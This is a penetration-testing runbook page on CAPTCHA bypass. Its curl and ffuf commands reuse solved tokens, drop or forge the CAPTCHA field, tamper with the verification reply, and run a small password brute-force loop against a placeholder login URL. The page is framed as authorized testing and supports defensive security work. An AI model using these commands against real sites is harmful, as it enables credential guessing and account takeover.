---
title: "CAPTCHA Bypass"
description: "Token reuse, missing server-side validation, header and response manipulation, and third-party integration flaws that let automated requests through."
phase: Web
order: 15
tags:
  - captcha
  - automation
  - business-logic
  - bypass
tools:
  - curl
  - ffuf
updated: 2026-10-01
---

A runbook for authorized CAPTCHA testing on **in-scope** targets. Goal: prove the server does not actually enforce the challenge, enabling automation. Test at low volume with authorization.

## 1. Capture the challenge flow

Solve one challenge by hand and record both the client submit and the server-side verification call.

```bash
# Inspect the token/field the client sends
curl -s -X POST https://target/login \
  -H "Cookie: session=..." \
  -d "user=me&pass=...&g-recaptcha-response=TOKEN" -i | grep -i '^set-cookie\|^HTTP'
```

Note the token's binding (IP, session, form) and whether expiry is enforced.

## 2. Reuse and share tokens

```bash
# Same solved token many times
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST https://target/login \
    -H "Cookie: session=..." -d "user=me&pass=...&g-recaptcha-response=TOKEN"
done

# Cross-session reuse
curl -s -X POST https://target/login -H "Cookie: session=OTHER" \
  -d "user=me&pass=...&g-recaptcha-response=TOKEN"
```

If every request succeeds, the token is reusable.

## 3. Remove or empty the CAPTCHA

```bash
# Drop the parameter entirely
curl -s -X POST https://target/login -H "Cookie: session=..." -d "user=me&pass=..." -i

# Empty, random, or boolean values
curl -s -X POST https://target/login -H "Cookie: session=..." -d "user=me&pass=...&g-recaptcha-response=" -i
curl -s -X POST https://target/login -H "Cookie: session=..." -d "user=me&pass=...&g-recaptcha-response=x" -i
```

Also disable the widget in the browser and submit directly through the proxy.

## 4. Tamper with the verification response

If the app decides success from the provider reply, intercept it in Burp: change the body to `{"success":true}`, alter the status code, or add `X-Captcha-Passed: true`. Block the outbound verification call and see whether the app fails open.

```bash
# Simulate a client-side success flag
curl -s -X POST https://target/login -H "Cookie: session=..." \
  -d "user=me&pass=...&captcha_verified=true" -i
```

## 5. Third-party integration flaws

- Test whether the site validates the hostname and secret when checking the token.
- Look for mixed site key/secret key usage or secrets leaked in the frontend.
- Check callbacks that mark a session verified from a client-controlled parameter.

## 6. Show brute-force impact

A CAPTCHA is usually the only brute-force control. Prove the bypass by running a small authorized loop, then report the missing server-side check.

```bash
# Low-volume credential loop against your own test account list
ffuf -u https://target/login -X POST \
  -d "user=me&pass=FUZZ&g-recaptcha-response=TOKEN" \
  -H "Cookie: session=..." -w small_passlist.txt -mc 200 -fs 0 -t 2
```

## Full pipeline

```bash
# 1. Solve once, then reuse the token repeatedly
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "reuse %{http_code}\n" -X POST https://target/login \
    -H "Cookie: session=..." -d "user=me&pass=...&g-recaptcha-response=TOKEN"
done

# 2. Drop the CAPTCHA parameter
curl -s -o /dev/null -w "dropped %{http_code}\n" -X POST https://target/login \
  -H "Cookie: session=..." -d "user=me&pass=..."

# 3. Empty / random token
curl -s -o /dev/null -w "empty %{http_code}\n" -X POST https://target/login \
  -H "Cookie: session=..." -d "user=me&pass=...&g-recaptcha-response="

# 4. Low-volume brute force to show impact
ffuf -u https://target/login -X POST \
  -d "user=me&pass=FUZZ&g-recaptcha-response=TOKEN" \
  -H "Cookie: session=..." -w small_passlist.txt -mc 200 -fs 0 -t 2
```

## Ethics & legality

- Only test targets within an authorized scope and with reasonable request volumes.
- Do not abuse third-party CAPTCHA providers or use paid solving services against unauthorized sites.
- Keep loops small, log the bypass sequence, and report the missing server-side enforcement.
